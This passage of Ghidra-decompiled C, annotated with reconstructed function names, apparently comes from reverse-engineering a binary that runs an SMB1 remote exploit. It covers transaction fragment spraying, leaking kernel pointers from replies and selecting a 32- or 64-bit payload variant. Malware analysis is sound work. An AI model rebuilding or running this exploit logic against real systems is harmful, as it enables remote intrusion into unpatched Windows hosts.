    puVar4[6] = 0x32e2a8;
    puVar4[7] = 1;
    puVar4[9] = 1;
    puVar4[0xb] = 0x31e5a8;
    puVar4[0xc] = 0x4200420;
    puVar4[0xd] = 0x1a72c0;
    puVar4[0xe] = 0x210;
    puVar4[0x10] = 0x210;
  }
  if (bVar1 == 1) {
    *puVar4 = 0x3000005;
    puVar4[1] = 0x10;
    puVar4[2] = SVar3;
    puVar4[3] = 1;
    puVar4[4] = 0x440;
    puVar4[5] = 0x80000;
    puVar4[7] = 100;
    puVar4[8] = 100;
    puVar4[9] = 100;
    puVar4[10] = 0x308140;
    puVar4[0xb] = 0x16;
    puVar4[0xc] = 0x145418;
    puVar4[0xd] = 0x16;
  }
  if (bVar1 == 0) {
    local_8 = local_8 + 0xfffc;
  }
  iVar2 = 0;
  do {
    iVar5 = rand();
    *(char *)((int)puVar4 + iVar2 + (local_8 & 0xffff)) = (char)iVar5 + '\x01';
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x420);
  uVar6 = Smb1ExchangeDataBlockVariantB_10003863(param_1,param_2,param_3,param_4,param_5,param_6,*param_7,'\x0e',puVar4);
  ReleaseTemporaryNetworkBuffer_100020D0();
  return uVar6;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1RunRepeatedTransactionSequence_1000407B
 * Ghidra symbol: FUN_1000407b | VA: 0x1000407B | original source line: 3970
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildTransactionRequest_10002C1E, Smb1ExchangeTreeConnection_10003061, Smb1ExchangeTransactionVariantA_100030FE, Smb1SendAndReceiveTransactionFragment_100035FA, Smb1ReceiveNetworkReply_1000688F
 */
Smb1RunRepeatedTransactionSequence_1000407B(undefined4 param_1,undefined2 param_2,ushort param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6)

{
  void *pvVar1;
  int iVar2;
  int iVar3;
  undefined4 extraout_ECX;
  undefined4 uVar4;
  undefined4 extraout_ECX_00;
  short *unaff_EDI;
  uint local_24;
  uint local_20;
  undefined4 *local_1c;
  int local_18;
  uint local_14;
  int local_10;
  uint local_c;
  void *local_8;
  
  local_24 = (uint)param_3;
  iVar2 = Smb1ExchangeTreeConnection_10003061(param_2,(undefined2 *)&local_24,param_4,param_5,*unaff_EDI);
  if ((iVar2 == 0) && (local_8 = (void *)AllocateZeroedHeapBuffer_10001000(0x8e), local_8 != (void *)0x0)) {
    local_14 = 0;
    local_10 = AllocateZeroedHeapBuffer_10001000(0x1000);
    if (local_10 != 0) {
      *unaff_EDI = *unaff_EDI + 1;
      local_18 = 0;
      local_20 = 0;
      local_c = 0x8000;
      local_1c = Smb1BuildTransactionRequest_10002C1E(param_6,0x7e00,0xc007,param_2,param_3,param_4,param_5,*unaff_EDI,'\0',
                              -1,(ushort *)&local_14);
      if (local_1c != (undefined4 *)0x0) {
        do {
          memcpy(local_8,local_1c,local_14 & 0xffff);
          ReleaseTemporaryNetworkBuffer_100020D0();
          local_1c = Smb1BuildTransactionRequest_10002C1E(param_6,(short)local_c + -0x200,0xc007,param_2,(short)local_24,
                                  param_4,param_5,*unaff_EDI,'\0',-1,(ushort *)&local_14);
          pvVar1 = local_8;
          if (local_1c == (undefined4 *)0x0) goto LAB_10004266;
          memcpy((void *)((int)local_8 + 0x47),local_1c,local_14 & 0xffff);
          ReleaseTemporaryNetworkBuffer_100020D0();
          iVar3 = Smb1ReceiveNetworkReply_1000688F((int)pvVar1);
          iVar2 = local_10;
          if ((iVar3 != 0) || (iVar3 = Smb1TransmitRequestBuffer_1000243F(param_1,2), iVar3 != 0)) {
            ReleaseTemporaryNetworkBuffer_100020D0();
            goto LAB_1000426e;
          }
          if (*(int *)(iVar2 + 9) != 0) goto LAB_10004266;
          local_20 = local_20 + (local_c & 0xffff);
          local_c = local_c + 0x1000;
          if (0xc000 < (ushort)local_c) {
            local_c = 0x8000;
          }
          if (0xfffff < local_20) {
            iVar2 = Smb1ExchangeTransactionVariantA_100030FE(param_1,param_2,(short)local_24,param_4,param_5,*unaff_EDI);
            if (iVar2 == 0) {
              ReleaseTemporaryNetworkBuffer_100020D0();
              ReleaseTemporaryNetworkBuffer_100020D0();
              Sleep(0x456);
              local_18 = 0;
              uVar4 = extraout_ECX;
              do {
                *unaff_EDI = *unaff_EDI + 1;
                iVar2 = Smb1SendAndReceiveTransactionFragment_100035FA(uVar4,0xfe80,0xc007,param_2,param_3,param_4,param_5,*unaff_EDI,
                                     '\0',-1,param_6);
                if (iVar2 != 0) {
                  return 0xffffffff;
                }
                local_18 = local_18 + 1;
                uVar4 = extraout_ECX_00;
              } while ((ushort)local_18 < 0x38);
              return 0;
            }
            goto LAB_10004266;
          }
          *unaff_EDI = *unaff_EDI + 1;
          local_1c = Smb1BuildTransactionRequest_10002C1E(param_6,(short)local_c + -0x200,0xc007,param_2,param_3,param_4,
                                  param_5,*unaff_EDI,'\0',-1,(ushort *)&local_14);
        } while (local_1c != (undefined4 *)0x0);
        local_1c = (undefined4 *)0x0;
      }
LAB_10004266:
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
LAB_1000426e:
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1RunAlternateFragmentSequence_100042DF
 * Ghidra symbol: FUN_100042df | VA: 0x100042DF | original source line: 4066
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReadWinsockLibraryStatus_10002088, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildTransactionRequest_10002C1E, Smb1BuildAndSendLargeTransaction_10003986, Smb1ReceiveNetworkReply_1000688F
 */
Smb1RunAlternateFragmentSequence_100042DF(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,short *param_6,undefined2 param_7)

{
  short sVar1;
  void *pvVar2;
  int iVar3;
  uint uVar4;
  undefined4 uVar5;
  int *piVar6;
  int *piVar7;
  int *piVar8;
  uint local_44;
  int local_40;
  undefined4 local_34;
  uint local_2c;
  undefined4 *local_28;
  uint local_24;
  uint local_20;
  int local_1c;
  undefined4 *local_18;
  int local_14;
  int local_10;
  int *local_c;
  byte local_5;
  
  pvVar2 = (void *)AllocateZeroedHeapBuffer_10001000(0x10);
  if (pvVar2 == (void *)0x0) {
    local_34 = 0xffffffff;
  }
  else {
    iVar3 = rand();
    local_34 = 0xffffffff;
    *(char *)((int)pvVar2 + 0xf) = (char)iVar3;
    local_24 = 0;
    local_2c = 0;
    local_1c = 0;
    local_5 = 0;
    local_10 = 2;
    local_18 = Smb1BuildTransactionRequest_10002C1E(param_7,0xfe80,0xc007,param_2,param_3,param_4,param_5,2,'\x01',-1,
                            (ushort *)&local_24);
    if (local_18 != (undefined4 *)0x0) {
LAB_10004357:
      local_20 = local_24 & 0xffff;
      iVar3 = AllocateZeroedHeapBuffer_10001000(local_24 * 7 & 0xffff);
      local_14 = iVar3;
      if (iVar3 == 0) {
LAB_100047ea:
        ReleaseTemporaryNetworkBuffer_100020D0();
      }
      else {
        local_c = (int *)0x0;
        do {
          uVar4 = (uint)local_c & 0xffff;
          if (uVar4 == 2) {
            memcpy((void *)(iVar3 + (local_20 & 0xffff) * 2),local_18,local_20 & 0xffff);
          }
          else {
            *param_6 = *param_6 + 1;
            local_28 = Smb1BuildTransactionRequest_10002C1E(param_7,0xfe80,0xc007,param_2,param_3,param_4,param_5,*param_6,
                                    '\x01',-1,(ushort *)&local_20);
            if (local_28 == (undefined4 *)0x0) goto LAB_100047e2;
            memcpy((void *)((local_20 & 0xffff) * uVar4 + iVar3),local_28,local_20 & 0xffff);
            ReleaseTemporaryNetworkBuffer_100020D0();
            iVar3 = local_14;
          }
          local_c = (int *)((int)local_c + 1);
        } while ((ushort)local_c < 7);
        local_28 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0x1000);
        if (local_28 == (undefined4 *)0x0) {
LAB_100047e2:
          ReleaseTemporaryNetworkBuffer_100020D0();
          goto LAB_100047ea;
        }
        iVar3 = Smb1ReceiveNetworkReply_1000688F(iVar3);
        if (iVar3 == 0) {
          local_20 = Smb1TransmitRequestBuffer_1000243F(param_1,7);
        }
        else {
          local_20 = 0xffffffff;
        }
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        if (local_20 != 0) goto LAB_100047ea;
        ReleaseTemporaryNetworkBuffer_100020D0();
        iVar3 = Smb1BuildAndSendLargeTransaction_10003986(param_1,param_2,param_3,param_4,param_5,(short)local_10,1,0,pvVar2,
                             &local_1c,(undefined2 *)&local_2c,'\x01');
        if (iVar3 == 0) {
          if ((local_1c != 0) && (0x39 < (local_2c & 0xffff))) {
            piVar8 = (int *)(*(ushort *)(local_1c + 0x33) + 4 + local_1c);
            piVar7 = (int *)(((local_2c & 0xffff) - 0x31) + local_1c);
            if (piVar8 < piVar7) {
              piVar6 = piVar8;
              do {
                local_c = piVar8;
                if ((((*(short *)(local_1c + 0x1c) == *(short *)((int)piVar6 + 0x2a)) &&
                     (*(short *)(local_1c + 0x20) == *(short *)((int)piVar6 + 0x2e))) &&
                    (*(short *)(local_1c + 0x1e) == (short)piVar6[0xb])) &&
                   ((char)piVar6[9] == '\x01')) {
                  uVar5 = ReadWinsockLibraryStatus_10002088(piVar6[-4],piVar6[-3]);
                  g_smb_payload_variant = (char)uVar5;
                  if (g_smb_payload_variant == '\0') {
                    local_44 = piVar6[-4];
                    if (local_44 < 0x80000000) break;
                    local_40 = 0;
                    piVar8 = piVar6 + -2;
                    piVar7 = piVar6 + -0xc;
                  }
                  else {
                    local_44 = piVar6[-4];
                    local_40 = piVar6[-3];
                    piVar8 = piVar6 + -4;
                    piVar7 = piVar6 + -0x1c;
                  }
                  if (local_c < piVar7) {
                    if (g_smb_payload_variant == '\0') goto LAB_100045d6;
                    goto LAB_10004555;
                  }
                  break;
                }
                piVar6 = (int *)((int)piVar6 + 1);
              } while (piVar6 < piVar7);
            }
          }
          goto LAB_10004798;
        }
      }
    }
LAB_10004806:
    ReleaseTemporaryNetworkBuffer_100020D0();
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return local_34;
  while( true ) {
    piVar7 = piVar7 + -1;
    if (piVar7 <= local_c) break;
LAB_10004555:
    if (((((char)*piVar7 == '\f') && (*(char *)((int)piVar7 + 1) == '\x02')) &&
        ((0xfe80 < *(ushort *)((int)piVar7 + 2) &&
         ((iVar3 = ReadWinsockLibraryStatus_10002088(piVar7[2],piVar7[3]), iVar3 != 0 &&
          (iVar3 = ReadWinsockLibraryStatus_10002088(piVar7[4],piVar7[5]), iVar3 != 0)))))) &&
       ((iVar3 = ReadWinsockLibraryStatus_10002088(piVar7[6],piVar7[7]), iVar3 != 0 &&
        (iVar3 = ReadWinsockLibraryStatus_10002088(piVar7[8],piVar7[9]), iVar3 != 0)))) {
      DAT_1001fad0 = piVar7[2];
      DAT_1001fad4 = piVar7[3];
      DAT_1001fad8 = piVar7[4];
      DAT_1001fadc = piVar7[5];
      goto LAB_1000462b;
    }
  }
LAB_10004798:
  ReleaseTemporaryNetworkBuffer_100020D0();
  local_5 = local_5 + 1;
  if (2 < local_5) goto LAB_10004806;
  local_10 = local_10 + 1;
  local_18 = Smb1BuildTransactionRequest_10002C1E(param_7,0xfe80,0xc007,param_2,param_3,param_4,param_5,(short)local_10,
                          '\x01',-1,(ushort *)&local_24);
  if (local_18 == (undefined4 *)0x0) goto LAB_10004806;
  goto LAB_10004357;
LAB_100045d6:
  if ((((((char)*piVar7 != '\f') || (*(char *)((int)piVar7 + 1) != '\x02')) ||
       (*(ushort *)((int)piVar7 + 2) < 0xfe81)) ||
      (((uint)piVar7[2] < 0x80000000 || ((uint)piVar7[3] < 0x80000000)))) ||
     (((uint)piVar7[4] < 0x80000000 || ((uint)piVar7[5] < 0x80000000)))) goto LAB_10004600;
  DAT_1001fad0 = piVar7[2];
  DAT_1001fad4 = 0;
  DAT_1001fadc = 0;
  DAT_1001fad8 = piVar7[3];
LAB_1000462b:
  DAT_1001fb44 = (undefined2)piVar6[0xc];
  uVar4 = 0xfe80 - *(ushort *)((int)piVar7 + 2);
  DAT_1001fae8 = uVar4 + local_44;
  DAT_1001faec = ((int)uVar4 >> 0x1f) + local_40 + (uint)CARRY4(uVar4,local_44);
  iVar3 = (local_44 - *piVar6) - DAT_1001fae8;
  DAT_1001fb2c = 1;
  DAT_1001fb08 = (char *)((int)piVar7 + (0xfe7c - (int)local_c));
  DAT_1001fb24._0_2_ = (short)piVar8 - (short)piVar7;
  DAT_1001fb28 = (short)DAT_1001fb24 + -4;
  DAT_1001fb10 = CONCAT22(DAT_1001fb10._2_2_,(short)DAT_1001fb24 + -0x10);
  DAT_1001fb14._0_2_ = (short)DAT_1001fb24 + 4;
  _DAT_1001fb0c = (char *)((int)piVar8 + (0x20 - (int)piVar7));
  DAT_1001fb18 = CONCAT22(DAT_1001fb18._2_2_,(short)DAT_1001fb24 + 0x38);
  DAT_1001fb38 = (uint)(*piVar6 == 0);
  sVar1 = 0;
  if (g_smb_payload_variant == '\0') {
    DAT_1001fb20 = (short)DAT_1001fb24 + -0x18;
    if (iVar3 == 0x9c) {
      sVar1 = (short)DAT_1001fb24 + 0x50;
    }
    else if (iVar3 == 0xa4) {
      sVar1 = (short)DAT_1001fb24 + 0x4f;
    }
    _DAT_1001fb1c = CONCAT22(DAT_1001fb1c_2,sVar1);
  }
  else {
    DAT_1001fb14._0_2_ = (short)DAT_1001fb24 + 8;
    _DAT_1001fb0c = (char *)((int)piVar8 + (0x28 - (int)piVar7));
    DAT_1001fb10._0_2_ = (short)DAT_1001fb24 + -0x20;
    DAT_1001fb18 = CONCAT22(DAT_1001fb18._2_2_,(short)DAT_1001fb24 + 0x40);
    DAT_1001fb28 = (short)DAT_1001fb24 + -8;
    DAT_1001fb20 = (short)DAT_1001fb24 + -0x2c;
    if (iVar3 == 0xe4) {
      DAT_1001fb1c = (short)DAT_1001fb24 + 100;
    }
    else if (iVar3 == 0xfc) {
      DAT_1001fb1c = (short)DAT_1001fb24 + 99;
    }
    else {
      _DAT_1001fb1c = (uint)DAT_1001fb1c_2 << 0x10;
    }
  }
  DAT_1001fb30 = (short)_DAT_1001fb1c + -2;
  DAT_1001fb34 = 0;
  if ((short)_DAT_1001fb1c == 0) goto LAB_10004798;
  DAT_1001fb34 = (short)DAT_1001fb18 + -0xb;
  local_34 = 0;
  goto LAB_10004806;
LAB_10004600:
  piVar7 = piVar7 + -1;
  if (piVar7 <= local_c) goto LAB_10004798;
  goto LAB_100045d6;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1StageLargeTransactionBuffer_10004820
 * Ghidra symbol: FUN_10004820 | VA: 0x10004820 | original source line: 4291
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildAndSendLargeTransaction_10003986
 */
int Smb1StageLargeTransactionBuffer_10004820(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
                undefined2 param_5,undefined2 param_6,undefined4 param_7,undefined4 param_8,
                undefined4 param_9)

{
  short in_AX;
  int iVar1;
  void *local_8;
  
  local_8 = (void *)AllocateZeroedHeapBuffer_10001000((uint)(ushort)(in_AX + 0xf));
  if (local_8 == (void *)0x0) {
    iVar1 = -1;
  }
  else {
    if (in_AX == 4) {
      *(undefined4 *)((int)local_8 + 0xf) = param_7;
    }
    if (in_AX == 8) {
      *(undefined4 *)((int)local_8 + 0xf) = param_7;
      *(undefined4 *)((int)local_8 + 0x13) = param_8;
    }
    iVar1 = Smb1BuildAndSendLargeTransaction_10003986(param_1,param_2,param_3,param_4,param_5,param_6,in_AX,(short)param_9,
                         local_8,(int *)&local_8,(undefined2 *)&param_9,'\0');
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return iVar1;
}



int __thiscall
/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeLargeTransactionFragment_1000489C
 * Ghidra symbol: FUN_1000489c | VA: 0x1000489C | original source line: 4322
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildTransactionRequest_10002C1E, Smb1ExchangeDataBlockVariantB_10003863, Smb1BuildAndSendLargeTransaction_10003986, Smb1StageLargeTransactionBuffer_10004820, Smb1ReceiveNetworkReply_1000688F
 */
Smb1ExchangeLargeTransactionFragment_1000489C(void *this,undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined4 param_5)

{
  undefined2 uVar1;
  short *in_EAX;
  uint uVar2;
  int iVar3;
  undefined4 *local_18;
  undefined4 *local_14;
  uint local_10;
  int local_c;
  uint local_8;
  
  local_10 = 0;
  local_14 = Smb1BuildTransactionRequest_10002C1E((short)param_5,0xfe80,0xc007,param_2,param_3,*(undefined2 *)this,param_4,
                          (short)param_5,'\0',-1,(ushort *)&local_10);
  if (local_14 != (undefined4 *)0x0) {
    uVar2 = local_10 * 7;
    uVar1 = *(undefined2 *)this;
    local_10 = local_10 & 0xffff;
    iVar3 = AllocateZeroedHeapBuffer_10001000(uVar2 & 0xffff);
    local_c = iVar3;
    if (iVar3 != 0) {
      local_8 = 0;
      do {
        uVar2 = local_8 & 0xffff;
        if (uVar2 == 2) {
          memcpy((void *)(iVar3 + (local_10 & 0xffff) * 2),local_14,local_10 & 0xffff);
        }
        else {
          *in_EAX = *in_EAX + 1;
          local_18 = Smb1BuildTransactionRequest_10002C1E((short)param_5,0xfe80,0xc007,param_2,param_3,uVar1,param_4,*in_EAX
                                  ,'\0',-1,(ushort *)&local_10);
          if (local_18 == (undefined4 *)0x0) goto LAB_100049ca;
          memcpy((void *)((local_10 & 0xffff) * uVar2 + iVar3),local_18,local_10 & 0xffff);
          ReleaseTemporaryNetworkBuffer_100020D0();
          iVar3 = local_c;
        }
        local_8 = local_8 + 1;
      } while ((ushort)local_8 < 7);
      local_18 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0x1000);
      if (local_18 == (undefined4 *)0x0) {
LAB_100049ca:
        ReleaseTemporaryNetworkBuffer_100020D0();
      }
      else {
        iVar3 = Smb1ReceiveNetworkReply_1000688F(iVar3);
        if (iVar3 == 0) {
          local_10 = Smb1TransmitRequestBuffer_1000243F(param_1,7);
        }
        else {
          local_10 = 0xffffffff;
        }
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        if (local_10 == 0) {
          ReleaseTemporaryNetworkBuffer_100020D0();
          local_14 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0x200);
          if (local_14 == (void *)0x0) {
            return -1;
          }
          iVar3 = Smb1ExchangeDataBlockVariantB_10003863(param_1,param_2,param_3,*(undefined2 *)this,param_4,(short)param_5,
                               (short)param_5,'\f',local_14);
          ReleaseTemporaryNetworkBuffer_100020D0();
          if (iVar3 != 0) {
            return -1;
          }
          uVar2 = DAT_1001fb08 + -0x200 + DAT_1001fb18;
          if (0xfe80 < (ushort)uVar2) {
            return -1;
          }
          iVar3 = Smb1StageLargeTransactionBuffer_10004820(param_1,param_2,param_3,*(undefined2 *)this,param_4,(short)param_5,0,
                               0,uVar2 & 0xffff);
          if (iVar3 == 0) {
            local_18 = (undefined4 *)0x0;
            local_14 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0x10);
            iVar3 = Smb1BuildAndSendLargeTransaction_10003986(param_1,param_2,param_3,*(undefined2 *)this,param_4,0,1,0xffff,
                                 local_14,(int *)&local_18,(undefined2 *)&param_5,'\x01');
            ReleaseTemporaryNetworkBuffer_100020D0();
            ReleaseTemporaryNetworkBuffer_100020D0();
            return (iVar3 == 0x10002) - 1;
          }
          return -1;
        }
      }
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return -1;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1BuildNextTransactionFragment_10004AFE
 * Ghidra symbol: FUN_10004afe | VA: 0x10004AFE | original source line: 4416
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: Smb1BuildAndSendLargeTransaction_10003986, Smb1StageLargeTransactionBuffer_10004820
 */
int Smb1BuildNextTransactionFragment_10004AFE(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
                undefined2 param_5,undefined2 param_6,undefined4 param_7,void *param_8,
                undefined4 param_9,int param_10,int param_11,undefined4 param_12)

{
  uint uVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar3 = param_11;
  iVar5 = param_10;
  uVar2 = param_9;
  if ((DAT_1001faf0 == param_10) && (DAT_1001faf4 == param_11)) {
LAB_10004b6e:
    iVar5 = Smb1BuildAndSendLargeTransaction_10003986(param_1,param_2,param_3,param_4,param_5,0,(short)uVar2 + -0xf,
                         (short)param_12,param_8,(int *)&param_8,(undefined2 *)&param_9,'\0');
  }
  else {
    uVar1 = DAT_1001fb08 + -0x200 + DAT_1001fb24;
    if ((ushort)uVar1 < 0xfe81) {
      iVar4 = Smb1StageLargeTransactionBuffer_10004820(param_1,param_2,param_3,param_4,param_5,param_6,param_10,param_11,
                           uVar1 & 0xffff);
      if (iVar4 == 0) {
        DAT_1001faf0 = iVar5;
        DAT_1001faf4 = iVar3;
        goto LAB_10004b6e;
      }
    }
    iVar5 = -1;
  }
  return iVar5;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1PrepareFragmentSequence_10004BA1
 * Ghidra symbol: FUN_10004ba1 | VA: 0x10004BA1 | original source line: 4453
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildNextTransactionFragment_10004AFE
 */
int Smb1PrepareFragmentSequence_10004BA1(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
                undefined2 param_5,undefined2 param_6)

{
  void *pvVar1;
  int iVar2;
  int iVar3;
  undefined4 local_8;
  
  local_8 = 4;
  if (g_smb_payload_variant != '\0') {
    local_8 = 8;
  }
  iVar2 = DAT_1001fad0 + 4;
  iVar3 = DAT_1001fad4 + (uint)(0xfffffffb < DAT_1001fad0);
  pvVar1 = (void *)AllocateZeroedHeapBuffer_10001000(0x13);
  if (pvVar1 == (void *)0x0) {
    iVar2 = -1;
  }
  else {
    *(undefined4 *)((int)pvVar1 + 0xf) = 0x1000;
    iVar2 = Smb1BuildNextTransactionFragment_10004AFE(param_1,param_2,param_3,param_4,param_5,param_6,local_8,pvVar1,0x13,iVar2,
                         iVar3,0);
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return iVar2;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1BuildTransactionFragmentChain_10004C1C
 * Ghidra symbol: FUN_10004c1c | VA: 0x10004C1C | original source line: 4484
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildAndSendLargeTransaction_10003986, Smb1BuildNextTransactionFragment_10004AFE
 */
Smb1BuildTransactionFragmentChain_10004C1C(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined4 param_6,undefined4 param_7,uint param_8,int param_9,
            uint param_10,undefined4 *param_11,ushort *param_12)

{
  ushort uVar1;
  undefined2 in_AX;
  SIZE_T SVar2;
  int iVar3;
  uint uVar4;
  void *pvVar5;
  int iVar6;
  uint uVar7;
  undefined4 uVar8;
  undefined4 local_18;
  uint local_14;
  int local_10;
  int local_c;
  void *local_8;
  
  local_18 = 0;
  local_10 = 0;
  local_c = 4;
  local_14 = 0;
  if (g_smb_payload_variant != '\0') {
    local_c = 8;
    local_14 = 4;
  }
  SVar2 = local_c + 0x2f;
  local_8 = (void *)AllocateZeroedHeapBuffer_10001000(SVar2);
  if (local_8 == (void *)0x0) {
    return 0xffffffff;
  }
  *(undefined4 *)((int)local_8 + 0xf) = param_6;
  *(undefined4 *)((int)local_8 + 0x13) = param_7;
  uVar7 = local_14 & 0xffff;
  *(undefined4 *)(uVar7 + 0x13 + (int)local_8) = 4;
  *(undefined4 *)(uVar7 + 0x22 + (int)local_8) = 0x1000;
  *(uint *)(uVar7 + 0x2f + (int)local_8) = param_10 & 0xffff;
  iVar3 = Smb1BuildNextTransactionFragment_10004AFE(param_1,param_2,param_3,param_4,param_5,in_AX,local_c,local_8,SVar2,param_8,
                       param_9,(uint)(ushort)DAT_1001fb14);
  ReleaseTemporaryNetworkBuffer_100020D0();
  if (iVar3 == -1) {
    return 0xffffffff;
  }
  if (DAT_1001fb40 == 0) {
    uVar7 = local_c + 0xfU & 0xffff;
    local_8 = (void *)AllocateZeroedHeapBuffer_10001000(uVar7);
    if (local_8 == (void *)0x0) {
      return 0xffffffff;
    }
    uVar4 = (uint)DAT_1001fb20;
    if (g_smb_payload_variant == '\0') {
      *(uint *)((int)local_8 + 0xf) = uVar4 + param_8;
    }
    else {
      *(uint *)((int)local_8 + 0xf) = uVar4 + param_8;
      *(uint *)((int)local_8 + 0x13) = param_9 + (uint)CARRY4(uVar4,param_8);
    }
    iVar3 = Smb1BuildNextTransactionFragment_10004AFE(param_1,param_2,param_3,param_4,param_5,in_AX,local_c,local_8,uVar7,param_8
                         ,param_9,(uint)(ushort)DAT_1001fb10);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if (iVar3 == -1) {
      return 0xffffffff;
    }
    DAT_1001fb40 = 1;
    local_8 = (void *)AllocateZeroedHeapBuffer_10001000(0x10);
    if (local_8 == (void *)0x0) {
      return 0xffffffff;
    }
    uVar7 = (uint)DAT_1001fb34;
    *(undefined1 *)((int)local_8 + 0xf) = 1;
    iVar3 = Smb1BuildNextTransactionFragment_10004AFE(param_1,param_2,param_3,param_4,param_5,in_AX,1,local_8,0x10,param_8,
                         param_9,uVar7);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if (iVar3 == -1) {
      return 0xffffffff;
    }
  }
  local_8 = (void *)AllocateZeroedHeapBuffer_10001000(0x13);
  if (local_8 == (void *)0x0) {
    return 0xffffffff;
  }
  *(undefined2 *)((int)local_8 + 0x11) = in_AX;
  *(undefined2 *)((int)local_8 + 0xf) = 0x23;
  iVar3 = Smb1BuildNextTransactionFragment_10004AFE(param_1,param_2,param_3,param_4,param_5,in_AX,4,local_8,0x13,param_8,param_9,
                       (uint)DAT_1001fb20);
  ReleaseTemporaryNetworkBuffer_100020D0();
  if (iVar3 == -1) {
    return 0xffffffff;
  }
  if (DAT_1001fb3c != 0) {
    pvVar5 = (void *)AllocateZeroedHeapBuffer_10001000(0x10);
    if (pvVar5 == (void *)0x0) {
      return 0xffffffff;
    }
    local_8 = pvVar5;
    iVar3 = Smb1BuildNextTransactionFragment_10004AFE(param_1,param_2,param_3,param_4,param_5,in_AX,1,pvVar5,0x10,param_8,param_9
                         ,(uint)DAT_1001fb1c);
    if (iVar3 == -1) goto LAB_10004e55;
    uVar7 = (uint)DAT_1001fb2c;
    *(undefined1 *)((int)pvVar5 + 0xf) = 2;
    iVar3 = Smb1BuildNextTransactionFragment_10004AFE(param_1,param_2,param_3,param_4,param_5,in_AX,1,pvVar5,0x10,param_8,param_9
                         ,uVar7);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if (iVar3 == -1) {
      return 0xffffffff;
    }
  }
  if (DAT_1001fb38 != 0) {
    local_8 = (void *)AllocateZeroedHeapBuffer_10001000(0x10);
    if (local_8 == (void *)0x0) {
      return 0xffffffff;
    }
    iVar3 = Smb1BuildNextTransactionFragment_10004AFE(param_1,param_2,param_3,param_4,param_5,in_AX,1,local_8,0x10,param_8,
                         param_9,(uint)DAT_1001fb30);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if (iVar3 == -1) {
      return 0xffffffff;
    }
    DAT_1001fb38 = 0;
  }
  DAT_1001fb3c = 1;
  local_8 = (void *)AllocateZeroedHeapBuffer_10001000(0xf);
  if (local_8 == (void *)0x0) {
    return 0xffffffff;
  }
  iVar6 = Smb1BuildAndSendLargeTransaction_10003986(param_1,param_2,param_3,param_4,param_5,DAT_1001fb44,0,0,local_8,&local_10,
                       (undefined2 *)&local_18,'\x01');
  ReleaseTemporaryNetworkBuffer_100020D0();
  iVar3 = local_10;
  if (iVar6 == -0x7ffffffb) {
    if (local_10 == 0) {
      return 0xffffffff;
    }
    uVar1 = *(ushort *)(local_10 + 0x31);
    *param_12 = uVar1;
    if (uVar1 < (ushort)local_18) {
      pvVar5 = (void *)AllocateZeroedHeapBuffer_10001000((uint)uVar1);
      *param_11 = pvVar5;
      if (pvVar5 == (void *)0x0) {
        uVar8 = 0xffffffff;
      }
      else {
        memcpy(pvVar5,(void *)(*(ushort *)(iVar3 + 0x33) + 4 + iVar3),(uint)*param_12);
        uVar8 = 0;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      return uVar8;
    }
  }
LAB_10004e55:
  ReleaseTemporaryNetworkBuffer_100020D0();
  return 0xffffffff;
}



/*
 * RECONSTRUCTED FUNCTION: CalculateSmb1TransactionOffset_10004FB3
